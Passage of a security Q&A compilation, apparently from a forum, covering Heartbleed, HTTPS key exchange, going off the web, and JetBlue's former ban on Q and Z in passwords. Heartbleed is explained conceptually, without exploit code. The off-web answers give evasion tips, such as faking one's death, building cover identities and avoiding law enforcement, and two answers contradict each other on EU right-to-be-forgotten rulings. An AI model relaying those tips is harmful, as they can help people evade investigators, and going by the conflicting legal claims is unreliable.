For completeness, I should mention that this vulnerability should affect anything that may use the OpenSSL library to perform TLS, which isn't limited to webservers; e.g., FTPS servers (but not SFTP), Email servers, Database servers all may be vulnerable depending on the configuration.

More info about the vulnerable commit

It's also worth noting that the same person who wrote the vulnerable code that doesn't verify the size of the payload was the same author of the Heartbeat extension to TLS (described in RFC 6520).  Note the protocol did not specify a maximum size of Heartbeats response (while specifying a minimum size), but allowed it to be arbitrary length and let the payload size be described by a two byte header (allowing it to go up to 65535 instead of only 255 with a 1-byte header, which would have only exposed under 255 bytes of the webserver processes' RAM).  I honestly can't think of any reasonable reason to require a heartbeats payload that's longer than 16 bytes (128-bit), and if you wanted to be super paranoid you could let it be 32 bytes (256-bit).  With those limitations, it would be very unlikely to leak much usable information.  

It's also curious that the vulnerable code is dated to the evening of New Years' Eve 2011, which seems like a likely time to pass something under the radar or with less scrutiny due to the holiday.
AnswerKenntnis:
In really plain English: the attacker says they're sending a packet of size "x" and asks the server to send it back, but actually sends a much smaller packet.  The OpenSSL library trusts the attacker, sends back the small real packet as the start of the reply, and then grabs data from memory to fill out the reply to the expected size.  This could be any data the server has handled recently, and often contains sensitive information.
AnswerKenntnis:
This example dialog - perhaps you are both characters, or you get them to ask the questions of you:

Q1:  What's your favourite colour (1 word)
A1:  Blue

Q2:  Where did you last go on holiday (2 words)
A2:  To France

Q3:  What car do you drive (1000 words)
A3:  Vauxhall Astra. Cheeseburger. Tomorrow I'm driving to London. I like cake. Ohhh a squirrel. My PIN is 1234. I like chickens. SPAAAACEEEE. Last night I ate spaghetti. BUD WEIS EEEEERRRR. etc etc etc


That last chunk is mainly garbage, but there might be a few good things in there.
AnswerKenntnis:
Here's an attempt to use almost no jargon at all.

When you connect to a "secure" website (one with a green bar and padlock icon), your browser and the website perform a bit of mathematical hocus-pocus and you both end up with a secret key - like a very long, random password - with which you can send each other encrypted messages.

As you browse around the site and click links, it would be very expensive to redo the whole hocus-pocus each time so the website and browser just carry on using the same key for a while. Since the website doesn't want to keep a list of every single key that every single visitor has ever used, a protocol called heartbeat was invented. As long as you're still browsing around, every now and then your browser will send the website a message saying HEARTBEAT, which means "I'm still here, keep hold of my key". The website replies something to the effect of "roger that". If the website doesn't hear any HEARTBEATs from you for a while, it presumes you've gone on to some other site and throws away your key to make space for new ones.

Actually, heartbeats do one more thing. You can send any text you like along with them and the website will reply with exactly the same text. Why it's done this way is not quite clear to me, I suppose it's so that your browser can check if something funny's going on (like the wrong text coming back, or texts coming back in the wrong order) and let you know that someone may be doing something nasty.

So your browser every now and then sends a message like "HEARTBEAT, text with 5 letters, HELLO" and the website replies "roger that, 5 letters, HELLO". The text can be pretty much anything, like the current date and time. You could send a poem if you want to.

The heartbleed bug is that if you send a message like "HEARTBEAT, 1000 letters, CHEESE" then if the website is using a program called OpenSSL to do the encryption it goes badly wrong. And OpenSSL is kind of the most common program used to do encryption on the internet. What it should do is notice that CHEESE has 6 letters, not 1000, and complain. Instead, it reads your message and writes it to somewhere in its memory. Then, it replies "roger that, 1000 letters, ..." and starts reading out the next 1000 letters from its memory starting at wherever it stored your CHEESE. So you get to hear whatever the next 994 letters in its memory are, and this could be literally anything. It could be the website's secret keys. It could be a poem. It could be other customers' passwords and credit card details. It could be a picture of a cat. It's completely random but every time you send a HEARTBEAT message like this, you get to see a different random portion of the website's memory so if you just repeat your HEARTBEATs often enough, you're quite likely to hit something interesting sooner or later.

The worst that can happen is that you get back the website's master keys, the ones used to start off the hocus-pocus whenever a new visitor comes to the site. If you do this, you can in theory read everything that everyone is doing on the site, as if there were no encryption at all. Whenever someone logs in, you'd get to see their password in the clear. That's not a nice thing to happen.
AnswerKenntnis:
I'll use one two three technical terms, "heartbeat," "bug," and "webserver." I hope that won't scare off your non-technical friends.

When computers exchange data over the internet, sometimes it is useful to know if the other one is still listening. In many places, there are provisions to do the equivalent of asking "Hey, are you listening? Can you tell me what I just said?" In different contexts, there are many different names for such techniques that sometimes even turn up in mainstream media---"echo" is one, "ping" another, and the one that has a serious bug in a very widely used piece of software is "heartbeat." This particular "heartbeat" scheme is not actually used in many applications, but because the general idea can be so useful, many computers allow it.

The problem is that one piece of software most webservers use has a bug: Depending on just how the "What did I just tell you?" is asked, it can be tricked into trying to repeat more than what the other side had actually sent, filling in the rest with random things the webserver happens to know. By asking in such a tricky way, one can get webservers with this bug to tell almost anything they know about, including user passwords and (from webservers that handle such information) sensitive data like credit card numbers, email contents, etc. And it doesn't stop there, even the secrets with which other computers could impersonate these webservers are at risk.

This is not limited to webservers, but that's where anyone using the internet comes into contact with it. But computer security people have their hands full now with lots of computers and lots of different software that may be affected.
AnswerKenntnis:
When you visit a webpage which uses "https", the connection between you and the webserver is encrypted. This protective layer is called SSL or TLS. An underlying component of this implementation has a security-problem with it - causing the server which serves a webpage to "leak data" (i.e. disclose memory contents to an attacker). There are some constraints on how this data is leaked, but it is very serious and could expose all kinds of data on the vulnerable server.


Here is a technical video which shows an example of data-leakage from a vulnerable server and also shows how to prevent data from being leaked:
https://www.youtube.com/watch?v=UjkK22VBzjA
AnswerKenntnis:
New analogy:

Imagine you're calling the bank to ask if one of its offices is open. You get a machine on the line (the infamous "for English, press 1" lady) and it asks you how many banks you want to know the hours for, and which banks. You then say you want the hours for 65,000 banks, but only give it the code for a single bank. The machine thinks that it needs to give the hours for 65,000 banks, but since you only give 1 bank code, it fills the rest with whatever it can find: bank statements from random accounts, credit card numbers and codes, a picture of the key for the safe, the discussion the manager has at the time with his doctor,... It doesn't realize that that other data is irrelevant, and that you should have only gotten opening hours for 1 bank.



Old answer:

Imagine your bank has a system where you can send a secure request for the current pincode of your debit card, and the system returns a pincode and a bank card number. This system gets an update where you can send a list of cards to reset.

You send a request for a list of 65,535 debit cards to reset, but only pass 1 card number. Instead of returning just that single card or throwing an error, your bank sends back the existing codes for 65,534 other cards from other random users.
AnswerKenntnis:
Imagine a book you never read and then you don't know the content because the book is closed, the heartbleed bug, is just a way to open a page randomly and being able to read the text, from the book. after extracting enought information you're able to replicate the book and replace it on a shelter without anybody being able to notice.
The book being either your computer or your server.  

That would be the most simple explanation I would give to non technical persons.


If you want a more precise version, let say you have a book closed with an electronic lock that book is your personal diary. You're the only one that have the key, so you're the only one to be able to both read and write it.
Too bad you electronic lock is defective and allow someone who know the trick to unlock it for 2 seconds.
By doing that more and more you will be able to read the whole content and eventually to modify it afterward.
AnswerKenntnis:
It's like this.

You're walking along the street and, passing the entrance to a bank, you encounter an autistic savant on his way out. He seems like a nice guy, but you're not, and you know you can use him for nefarious purposes, because you've watched enough movies to have learnt that savants can retain and repeat amazing amounts of data and are generally pretty observant, too.

So, you ask him for the time. He tells you the time, but can't help but keep talking. He tells you every bank account number and password that went past his eyes and ears whilst he was in there.

That information is now yours. All you had to do was ask for the time because, by virtue of his condition, the savant was unable to stop himself from telling you more than he was supposed to. What he doesn't realise is that, by asking for the time with your nefarious purposes, since you knew what was likely to happen, you asked for more than you were supposed to as well.

Poor chap.
QuestionKenntnis:
How is it possible that people observing an HTTPS connection being established wouldn't know how to decrypt it?
qn_description:
I've often heard it said that if you're logging in to a website - a bank, GMail, whatever - via HTTPS, that the information you transmit is safe from snooping by 3rd parties. I've always been a little confused as to how this could be possible. 

Sure, I understand fairly well (I think) the idea of encryption, and that without knowing the encryption key people would have a hard time breaking the encryption. However, my understanding is that when an HTTPS connection is established, the encryption key is "discussed" between the various computers involved before the encrypted connection is established. There may be many factors involved in choosing an encryption key, and I know it has to do with an SSL certificate which may come from some other server. I do not know the exact mechanism.

However, it seems to me that if the encryption key must be negotiated between the server and the client before the encryption process can begin, then any attacker with access to the network traffic would also be able to monitor the negotiation for the key, and would therefore know the key used to establish the encryption. This would make the encryption useless if it were true.

It's obvious that this isn't the case, because HTTPS would have no value if it were, and it's widely accepted that HTTPS is a fairly effective security measure. However, I don't get why it isn't true. In short: how is it possible for a client and server to establish an encrypted connection over HTTPS without revealing the encryption key to any observers?
AnswersKenntnis
AnswerKenntnis:
It is the magic of public-key cryptography. Mathematics are involved.

The asymmetric key exchange scheme which is easiest to understand is asymmetric encryption with RSA. Here is an oversimplified description:

Let n be a big integer (say 300 digits); n is chosen such that it is a product of two prime numbers of similar sizes (let's call them p and q). We will then compute things "modulo n": this means that whenever we add or multiply together two integers, we divide the result by n and we keep the remainder (which is between 0 and n-1, necessarily).

Given x, computing x3 modulo n is easy: you multiply x with x and then again with x, and then you divide by n and keep the remainder. Everybody can do that. On the other hand, given x3 modulo n, recovering x seems overly difficult (the best known methods being far too expensive for existing technology) -- unless you know p and q, in which case it becomes easy again. But computing p and q from n seems hard, too (it is the problem known as integer factorization).

So here is what the server and client do:


The server has a n and knows the corresponding p and q (he generated them). The server sends n to the client.
The client chooses a random x and computes x3 modulo n.
The client sends x3 modulo n to the server.
The server uses his knowledge of p and q to recover x.


At that point, both client and server know x. But an eavesdropper saw only n and x3 modulo n; he cannot recompute p, q and/or x from that information. So x is a shared secret between the client and the server. After that this is pretty straightforward symmetric encryption, using x as key.

The certificate is a vessel for the server public key (n). It is used to thwart active attackers who would want to impersonate the server: such an attacker intercepts the communication and sends his value n instead of the server's n. The certificate is signed by a certification authority, so that the client may know that a given n is really the genuine n from the server he wants to talk with. Digital signatures also use asymmetric cryptography, although in a distinct way (for instance, there is also a variant of RSA for digital signatures).
AnswerKenntnis:
Here's a really simplified version:


When a client and a server negotiate HTTPS, the server sends its
public key to the client.
The client encrypts the session encryption key that it wants to use using the
server's public key, and sends that encrypted data to the server.
The server decrypts that session encryption key using its private key, and starts using it.
The session is protected now, because only the client and the server can know the session encryption key.  It was never transmitted in the clear, or in any way an attacker could decrypt, so only they know it.


Voil├á, anyone can see the public key, but that doesn't allow them to decrypt the "hey-let's-encrypt-using-this-from-now-on" packet that's encrypted with that public key.  Only the server can decrypt that, because only the server has that private key.  Attackers could try to forge the response containing an encrypted key, but if the server sets up the session with that, the true client won't speak it because it isn't the key that the true client set.

It's all the magic of asymmetric key encryption.  Fascinating stuff.

P.S. "really simplified" means "mangled details to make it easier to understand". Wikipedia "Transport Layer Security" gives an answer more correct in technical particulars, but I was aiming for "easy to grok".
AnswerKenntnis:
The other answers are good, but here's a physical analogy that may be easier to grasp: 

Imagine a lock-box, the kind with a metal flap that you put a padlock on to secure.  Imagine that the loop where you put the padlock is large enough to fit two padlocks.  To securely exchange send something to another party without sharing padlock keys, you would 


put the "Thing" in the box, and lock it with your padlock.
send the locked box to the other party.
they put their padlock on the loop also (so that there are two locks on it), and return the double-locked box to you
You remove your padlock, and return the now singly-locked box to them
they remove their own lock and open the box.


With encryption the locks and keys are math, but the general concept is vaguely like this.
AnswerKenntnis:
In simple words: There are two different encryptions taking place:


First there is the public/private key encryption. The client uses the public key of the server (which is included in the certificate) to encrypt some information that only the server can decrypt using it's private key.
Based on this information a session key is derived, that is only known to the server and the client. This session key is used to encrypt that data.


This is a very rough summary.

There is a lot more taking place to prevent various kinds of attack:


For example the client tries to validate the certificate of the server to ensure that he is not talking to a man in the middle.
There are different algorithms and key lengths for the session keys that have to be negotiated
Random numbers that are only used once are used to prevent replay attacks.
The Diffie-Hellman key exchange protocol can be used to generate a session key that cannot be reconstructed by someone who recorded the encrypted data transmission and gets access to the private key of the server at a later time (Perfect forward secrecy).
...
AnswerKenntnis:
I think of the six answers already up, gowenfawr's explains it best. Read that first as this is simply an addendum.

On Diffie-Hellman

Several answers mention Diffie-Helman exchanges. These are implemented in a minority of exchanges. A DH exchange is signed by the server's key to prevent a MITM attack. Because the key is not encrypted to a public key, it cannot be recovered by using a captured private key against captured traffic of a key exchange. This is the idea of Perfect Foward Secrecy. OpenSSL provides for both "regular" and DH key exchanges depending on configuration.

On MITM / Signature chains

Both public-key and DH exchanges prevent somebody from observing the connection and deriving the key. This is based on a whole bunch of math problems that you can research / look at Thomas' answer to understand. The problem with either is the MITM attack. For public key cryptography, this is fixed by either knowing the public key beforehand (even if the exchange is observed) or by way of a certificate chain. Examples: I trust Alice, and Alice signed Bob's key certifying it really is his. Also known as Google is certified by... err, Google. It appears they're in Firefox as their own CA. So, random_bank's_ssl is signed by Verisign, and my browser trusts Verisign to only issue legitimate certs.

Problems do exist with this model when you run into things like a certificate authority being compromised. In that case, an MITM attack becomes possible.
AnswerKenntnis:
Look at Diffie Hellman : http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange

For performances reasons, the connection is encrypted with symetric key. But the symetric key is generated during connection etablishement and never exchanged inc lear, but using asymetric cryptography.

Asymetric cryptography is a technique were two key are needed : a public one and a private one. What is crypted with the public key has to be decrypted with the private key and the other way around. So both computer can exchange data based on each other public keys. But only the owner of the corresponding private key can decrypt it. The private key is never exchanged, so, even if you have sniffed everything, you cannot decrypt anything. Thoses technics are expansive, so are used to exchange the key for symetric cryptography's key and not data themsleves.
AnswerKenntnis:
The key thing there is asymmetrical, or public key encryption. It means you have two pieces of key, public and private, and a mathematical function that is easy to calculate to one direction but very, very hard to calculate to the other.

So, when servers sends its public key, we can use the public key to easily encrypt our stuff, but only with the another key of the pair, private key in this case, you can easily decrypt it.
AnswerKenntnis:
The EcoParty Conference announced a tool called BEAST that reportedly decrypts SSL3/TLS1.0 traffic and lower, presumably by observing it.

Here is a link to the news report 

I'm sure over the coming days we will hear more about this, the workarounds and limitations.  

This section below will be updated as more information is discovered

This hack assumes the attacker can somehow see your network traffic; though spyware or through a network capture.  Poorly administered machines, and Wifi users are the most likely the usual suspectsΓÇª though not limited to that use-case.

There are reports that we can mitigate this risk by changing the SSL*/TLS 1.0 cipher list to RC4, and not supporting older combinations.  Another mitigation is to increase the length of the authentication token, which would slow down the attack.  Modifying the Siteminder and ASP.net membership authentication cookie configuration may help here.

Just so you know this vulnerability is exposed by the same people who announced the ΓÇ£Padding Attack on ASP.NETΓÇ¥ last year.   That old issue puts every IIS webserver at risk just by being turned on, which appears to be more serious than this attack.  


  Do share any links you find that mention or confirm these vulnerable
  scenarios, or mitigations here.  As it stands now, some of this is
  speculation and not vetted by Cryptology experts.
QuestionKenntnis:
How can someone go off-web, and anonymise themselves after a life online?
qn_description:
With data mining tools like Maltego and other correlation tools for large data sets, if we conduct any transactions online assume that these can all be collated to build a good picture of what we do, buy, read etc (hence Google etc).

If a normal person, with a large online history decides to go off-web, is there an effective way to do this?
AnswersKenntnis
AnswerKenntnis:
The problem is heuristics. All mentioned tools are built on heuristics and the only way to avoid them is to change how you live completely. You can be fingerprinted by the modules installed in your browser. By the programs you use and the frequency you use them. 

These days you're going further than just online behavior. Shops know what you buy in what amounts, because nobody buys all the same brands you are getting fingerprinted constantly. This is used for targeted advertising, but it can also theoretically be used to track you.

MIT's Reality Mining project proved the same using smartphones. You prefer certain apps, you use your phone at certain intervals, you move around certain places. This all contributes to a somewhat unique pattern (back when I did some research on it during my internship we were getting 91% certainty in simulations, even when people changed their SIM card every few days we were still able to track them  based on the SSIDs they encountered, places they went, apps they installed and used, when they checked their phones, Bluetooth devices they connect to, cell towers they passed at a certain moment in time and what smileys they use in text messages). 

Avoiding heuristics means changing everything you do completely. Stop using the same apps, accounts, go live somewhere else and do not buy the same food from the same brands. The problem here is that this might also pop up as a special pattern because it is so atypical.  

Changing your identity is the first step. The second one is not being discovered. As Thomas said the internet doesn't forget. This means that photos of you will remain online, messages you posted, maybe even IDs you shared will remain on the net. So even when changing your behavior it only will need one picture which might expose you.
AnswerKenntnis:
You cannot enforce forgetfulness. The Web is like a big memory, and you cannot force it to forget everything about you(*). The only way, thus, is to change your identity so that everything the Web knows about you becomes stale. From a cryptographic point of view, this is the same case as with a secret value shared by members of a group: to evict a group member, you have to change the secret value.

(*) Except by applying sufficiently excessive force. A global thermonuclear war, with all the involved EMP, might do the trick, albeit with some side effects.
AnswerKenntnis:
I agree with one of the comments that one could write a book on this (I have an idea!) because this could get broad, but consider that these data mining tools (and I build them!) make some major assumptions.  For instance, consider search history.  One could easily build a program or a tool that would do "random" searches on topics where a person lacks interest.  I've done this with Google where a program will search for dogs, dog food or dog treats and months later, I suddenly see these advertisements appearing everywhere.


  if we conduct any transactions online these can all be collated to
  build a good picture of what we do, buy, read etc


When it comes to finances, it's similar; I have to make an assumption that the data I receive are an accurate indicator of who you are.  Suppose you make 1/3 or more of your purchases completely away from your interest, for instance, you're truly a Libertarian, but you decide to subscribe to a Socialist magazine.  How accurate are my data then?  Also, you may change in ten years, so how accurate will my data be then, unless I account for it (and how effective then is it to have all the historic data)?

Of course, we could all argue, who in the world would do that?  If you've ever read Soros' The New Paradigm For Financial Markets he mentions his family went through WWII without the trouble many Jews had because, as I interpret it, his family was careful with the information they provided to others.  Privacy, historically, is priceless, even if a few generations mistakenly think it's not.

As a note, this answer only addresses the above concern with money.
AnswerKenntnis:
All the answers posted here are awesome. But I would like to add a few points. When you start with removing your online prints :


Make a list of all websites where you have accounts or which are linked to you in some way.
One by one, remove your personal details, friends, etc. Add misinformation - new obscure data, new friends, new interests, anything else you can think of. De-link your related accounts, re-link them to other fake ones.
Let the poisoned information stay for some time. Meanwhile, you could additionally change these details again. Poisoning the poisoned! Ensure that there is no visible pattern or link between any of the poisoned accounts.
Then you could delete all of them, again very slowly.


My idea behind this approach is what the other answers have already said, to poison the original data. I believe that all sites store your history but they won't log your 'previous' personal details like name, dob etc(I'm not sure about this, could someone confirm?)

Once you've poisoned your accounts, they should remain so for some time. Once again, how long I cannot know. Probably one or two months or more. And finally you delete those accounts, all of them.

You could also consider using some of these accounts, the less conspicuous,  to spam others(most sites discard spammers as unimportant and non-human).

Ideally, when you plan on going off the web, you will have to plan in advance, start months before. It is not an easy process, and to be anonymous and remain anonymous is a very tough challenge.
AnswerKenntnis:
My take on this is that you have a couple of options:

Entirely change your name, behaviour, appearance, your country, your friends etc so there is no correlation between data prior to the change and post-change. Like witness protection programmes, but with everything you do, not just your physical presence. Your buying habits have to change in department stores, you may need to develop a taste in different foods...

An alternative is to take Question3CPO's answer a bit further and deliberately poison the results of any data analysis by making random or deliberately wrong choices on a significant number of your daily activities. I have a feeling this could take some years to accomplish, and once you change identity, you still can't go back to your original behaviour as the original data store may still match you.
AnswerKenntnis:
Although you probably won't be able to delete what's already there, you could go through the other route: generate noise to cover the real information.

Create several profiles with the same name or username you have been posting online and pretend to be interested in many fields. Do is progressively, so as not to be evident. 

This will work when it comes down to bury a Google search engine result, for example. 

Too much information equals little information.
AnswerKenntnis:
Anyone who considers going off-web and changing identity should also change country imo.

Basically, move to a country that is different enough from where you currently live so that you'll be effortlessly forced to change your friends, habits, etc., in a word the signature you leave behind.

You can always return home later if you really miss it. The key is to develop new tastes and habits before doing so.

Unless you shouldn't return home at all, as is the case if home is one of the more advanced countries -- one with the likes of the NSA, or where tracking is ubiquitous.

Naturally, it helps to reduce the signature you leave around to begin with, e.g. use cash, don't leave pictures online, etc., as well as add noise to the signal you leave behind (e.g. by having a bot do random searches for you.)
AnswerKenntnis:
The answer depends on how hard people are looking for you. For someone like Edward Snowden, this is quite literally impossible. With the world's best-funded and most heavily-equipped group of spies hell-bent on keeping track of you, you cannot disappear.

Other people can be lost and forgotten in their own home. If nobody is looking for you, you might as well already be dead: and in fact if you were, nobody would know.

If you have build a solid life and legacy online, then that's where your identity is: online. In such a case, your own personal bag of flesh is only attached to that identity at a few critical connection points. Photo-identification documents, perhaps; or the memories of others who know you. You could either disassociate your online identity with your physical one over time using a systematic stream of misinformation, or perhaps quietly relocate yourself to some place where records are not so systematically kept and processed. As long as you don't leave a persistent trail of breadcrumbs and nobody is watching you terribly closely, this should be reasonably simple. The proud tradition of starting a new life in a foreign land has been pursued by an uncountable host of characters over the centuries. It's as possible today as it ever has been, though the list of candidate destinations is smaller.
AnswerKenntnis:
If you are willing to assume a new identity and break all ties with the past then yes, you could drop off the net, change your name, and move. Create a new bank account under the new name, get a job under the new name, etc. If you never have an email account after that or go on the web again your new identity really would be off-web. 

As for whether you could go off-web without taking such drastic steps then the answer is no. Many web sites have an option to delete your account but almost none take the step of removing all your previous data. Remember how many sites are "free"? Well, you paid for it by allowing them to use your data how they like as long as they like. 

Legislation is no help here. Even in the EU, where privacy laws are the most strict, the EU court back in June ruled that there is no right to be forgotten. In this case Google was judged not to be required to delete data even if it was requested, as it was an aggregator and not the controller of the data. 

Your online identity is there to stay, partly because that's the price you pay for a free service.
AnswerKenntnis:
Time.

Modify (with fake information) and/or remove information in all your web accounts. Use non-track browsers (like private window in Firefox) or Tor. And just wait.

With time, maybe 1, 2, 3 or 10 years, most of your information will disappear from internet.

Most of your web accounts don't want to store your information eternally because they will not have benefit.
AnswerKenntnis:
I don't think it's really all that possible to remove yourself entirely. Go remove yourself from as many services you have accounts for, either by doing it yourself or asking the service provider to do it. 

If you have a website, change it so that it only ever returns HTTP Response 410: http://www.hanselman.com/blog/410GoneThoughtsOnMarkDiveintomarkPilgrimsAndWhysInfosuicides.aspx. This will tell any consumers of the site that they should remove anything they have that originated from that site.

Stop posting anything by any of your online identities and hopefully people will stop reposting whatever you said, and eventually maybe the search engines will find stuff too old and they will stop indexing it. Unlikely though.

I'm sure that if you begged, pleaded, and sold your soul to them, Google might even consider listening to your request to have your identity removed from their indexes before they flag your name for further indexing.  :)
AnswerKenntnis:
Anything you ever wrote or published on the Internet is there forever. Trying to remove it is futile. Hordes of robots and search engines in dozens of countries that you have never heard of have already archived it and will never let it go, however nice you may ask. A few countries (e.g. France) offer Laws under which you can ask for removal of personal information, but there is a difference between asking and being granted, and such laws extend only to the country borders, not beyond.

Also, you cannot force people to forget. Mind control is illegal, and tricky.

Information can still be lost by being drowned into an ocean of other information. The Internet at large appears to be quite good at generating terabytes of meaningless junk, but search engines have improved too, and still manage to extract and index information within all that mess. One day, entropy will win, and grant you forgetfulness of your past actions.

In the meantime, Internet is like a ultimate responsibility machine. You have to be careful. One common way to evade having to live with your misbehaviours, that many people employ, is the use of pseudonyms -- and you already know that (unless "lop" is your real name, in which case you should sue your parents for cruelty).
AnswerKenntnis:
Well you can be hidden but you can not be forgotten. You can first edit then remove all the images and info on all websites. Request to Google and every other provider to delete all the info about yourself. Make your email/phone number etc hidden and so on...

However, this would only hide you from other end-users, where end-user includes hackers etc... But it is known that neither Facebook nor Google and some other companies never delete anything. Thay may take it off the internet or securely hide it, but they would never ever delete anything from their own database, and you agreed to this. 

So basically, you can hide your past but you can't delete it. Big companies will always have them, and since they are mostly U.S. based, the U.S. government will have it... And if a talented hacker can get in somehow, he will have it... And even if you change your name and etc (which is a lame idea in my opinion) this wouldn't stop them, would it?

So basically, you can hide your past from your creepy gf/bf but that's pretty much it. 

If you want to stay anonymous on the internet, log off...
AnswerKenntnis:
It is not possible because most services do not permit removal at all and, even  if some do, it is just a declaration most of them  do not really delete but just hide that data.    

This is too big topic but I'll give just a few hints that such attempts are senseless:    


the laws of most countries require to store most data and accountspassed through servers for many years; it is the matter of security - just imagine the cybercrime opportunities if accounts were really deleted;    
OLAP (Online Analytical Processing) databases are read-only and most approaches to data processing are that data are never deleted;    
when someone replied you in a forum with quoting, this quote with your account username quoted is still there publicly available to all even if you removed/hidden your account;      
"Yourself" is not just username(s), account(s), IPs, stored discussions, comments in isolation. It is most probably all of them (btw, interconnected and trackable) including the logo in ISPs servers about your connections to internet even during the time when you believe you are sleeping.  

Internet is not based or functioning on self-suicidal modes and as far as you connect to it, "Yourself" is part of it and attempts of self-suicide "Yourself" is synonym of killing the internet.  


PS
Might be I did not understand the question.  

Also, it is most probable, that we are trying to dispute the things without agreeing on common definitions of used terms first , what is also senseless.
AnswerKenntnis:
It is not possible to eradicate your online presence but you can make it so much confusing that it become difficult for anyone to connect the dots. The grugq has a few guidelines that you need to follow:


Put the Plumbing in first
Create a cover (new persona)
Work on the legend (history, background, supporting evidence for the
persona)
Create sub-aliases
Never CONTAMINATE


You cannot delete what you post online but you can control what you put online.


Never reveal your operational details
Never reveal your plans
Never trust anyone
Never confuse recreation with hacking (or anything else you want to
hide)
Never operate from your own home or from one place
Be proactively paranoid
Keep personal life and online life separate
Keep your personal environment contraband free (it allows undue
attention from LEA)
Don't talk to LEA
Don't give anyone power over you (in other words don't give anyone
 the information which might be used for blackmailing)


You can find further details in his presentation here
AnswerKenntnis:
the other alternative is to fake your death, distance yourself from all your past cyber life. change software,food and communications tastes. have someone report your social accounts as no longer in use but the ultimate decision lies in change of identity and life pattern.
AnswerKenntnis:
Pack your bags, leave the country, renounce your citizenship, and become a hermit living near the pole of inaccessibility in Africa for the next 10 years. After that, few would ever recognize you, perhaps not even your own family.
AnswerKenntnis:
Recent developments:

In May 2014, the European Court of Justice backed "a right to be forgotten" in a case against Google brought by a Spanish man who was offended by search results. The court said links to "irrelevant" and outdated data should be erased on request. 

For an EU resident who wishes to remove all online traces about himself/herself, this ruling could be very important. Search engines and other players in the EU market will have to abide by these rules.
AnswerKenntnis:
Disinformation.
Propaganda.
Censorship.

You might still be there, but the objective is to make it too much trouble for anyone to try to find you amidst all the crap.
AnswerKenntnis:
In addition to all of the above and below answers, to truly anonymise yourself you need to get a name change. That way when people meet you and search for you online, any of the accounts that you used with your real name will no longer come up (as it was your old name). However name changes are public record, so in reality it's just more "security through obscurity."
QuestionKenntnis:
How exactly does the OpenSSL TLS heartbeat (Heartbleed) exploit work?
qn_description:
I've been hearing more about the OpenSSL Heartbleed attack, which exploits some flaw in the heartbeat step of TLS. If you haven't heard of it, it allows people to:


Steal OpenSSL private keys
Steal OpenSSL secondary keys
Retrieve up to 64kb of memory from the affected server 
As a result, decrypt all traffic between the server and client(s)


The commit to OpenSSL which fixes this issue is here 

I'm a bit unclear - everything I've read contains information about what one should do about it, but not how it works. So, how does this attack work?
AnswersKenntnis
AnswerKenntnis:
This is not a flaw in TLS; it is a simple memory safety bug in OpenSSL.

The best explanations I've run across so far are the blog posts Diagnosis of the OpenSSL Heartbleed Bug by Sean Cassidy and Attack of the week: OpenSSL Heartbleed by Matthew Green.

In short, Heartbeat allows one endpoint to go "I'm sending you some data, echo it back to me". You send both a length figure and the data itself. The length figure can be up to 64 KiB. Unfortunately, if you use the length figure to claim "I'm sending 64 KiB of data" (for example) and then only really send, say, one byte, OpenSSL would send you back your one byte -- and 64 KiB (minus one) of other data from RAM.

Whoops!

This allows the other endpoint to get random portions of memory from the process using OpenSSL. An attacker cannot choose which memory, but if they try enough times, their request's data structure is likely to wind up next to something interesting, such as your private keys, or users' cookies or passwords.

None of this activity will be logged anywhere, unless you record, like, all your raw TLS connection data.

Not good.



The above xkcd comic does a nice job illustrating the issue.



Edit: I wrote in a comment below that the heartbeat messages are encrypted. This is not always true. You can send a heartbeat early in the TLS handshake, before encryption has been turned on (though you're not supposed to). In this case, both the request and response will be unencrypted. In normal usage, heartbeats ought to always be sent later, encrypted, but most exploit tools will probably not bother to complete the handshake and wait for encryption. (Thanks, RedBaron.)
QuestionKenntnis:
Why would you not permit Q or Z in passwords?
qn_description:
Jetblue's password requirements specify that, among other stringent requirements:


  Cannot contain a Q or Z


I can't fathom a logical reason for this, unless it were say, extremely common for the left side of keyboards to break, but then you wouldn't allow 'A' either :)

What would be the reason for this security requirement?
AnswersKenntnis
AnswerKenntnis:
It's a leftover from the time when keypads didn't have the letters Q and Z. Security-wise, there's no reason. It's just because of old systems.

To clarify:

You used to be able to enter your password over the phone. Some phones didn't have the letters Q or Z, like the one on the picture below.


  
  Image courtesy: Bill Bradford on flickr.com


Because of this, passwords including these characters were disallowed. They haven't changed this requirement for whatever reason: Legacy systems, poor documentation, or they just don't care.
AnswerKenntnis:
On old phones, there were no letters "Q" or "Z": 7 is "PRS" and 9 is "WXY".  So if you wanted to allow users to enter the password using the button on the phone, "Q" and "Z" presented a problem.  Disallowing them is an easyΓÇöif somewhat crudeΓÇösolution.
AnswerKenntnis:
As other people have commented, it's a leftover from telephone dials and TouchTone(tm) pads initially not having Q or Z on them, and not having consistent locations when they were added by various manufacturers in various countries, and some systems that needed the option to set your password on a computer keyboard but later also log in from a phone keypad.

A user interface design conference at Bell Labs I went to back around 1990 had one session on the "Where to put Q and Z on a TouchTone(tm) pad" problem.  The speaker referred to it as "The issue that just won't die."  

It was pretty well attended, because it was at a convenient time, and an issue that everybody could intuitively understand and appreciate.  The problem and solutions are simple and arbitrary and any one you choose has problems with it, or sometimes more problems.
AnswerKenntnis:
There is direct confirmation from Jetblue via CNN now.

American Airlines and IBM developed SABRE to facilitate making travel reservations by telephone at scale, in real time, in the late 1960's. However, rotary and touch-tone phones didn't have a Q or Z then.


  The number 1 belonged to long distance calls, and 0 for the operator.
  That left eight numbers to cover the entire alphabet. Bell Telephone
  Company assigned three letters to each number and left out the two
  letters we use least: 'Q' and 'Z.' That's how airlines became
  dependent on a phone-based reservation system with a limited alphabet.


Sabre still exists, and partners with most airlines, including JetBlue. JetBlue told CNN that the "no Q or Z" rule still applies for JetBlue employees accessing Sabre. JetBlue passed the restriction along to TrueBlue members for their passwords, as described in the company password FAQ. 


  The rule was quietly dropped and is no longer active. You can
  currently create nearly any password you want, as long as it's between
  eight and 20 characters. JetBlue told CNN it's now updating its FAQ
  page, but the company wouldn't comment on when they changed the rule.


Qs and Zs are allowed now. It is not a legacy system holdover for Sabre, but it was for retail customers.
AnswerKenntnis:
Fundamentally, there is not any outright technological reason to ban these two characters from passwords.

That being said, JetBlue may (and it's impossible for us to know for certain without confirmation from JetBlue) have either:


Business Logic that dictates such a ban (though I, like you,
can't fathom a reason)
Legacy code in their systems that prevents
the usage of these characters or their web app may import user accounts into another legacy systems that have such a ban in place, so they "bubble up"
that requirement to the web app.  This is not uncommon in web apps that interface with older AS/400 (IBM iSeries) or mainframe systems.


Given that most modern web platforms allow for escaping pretty much any character in the ASCII set, I personally find that banning characters from passwords is normally just due to companies not wanting to update their code to properly escape the input users supply. YMMV

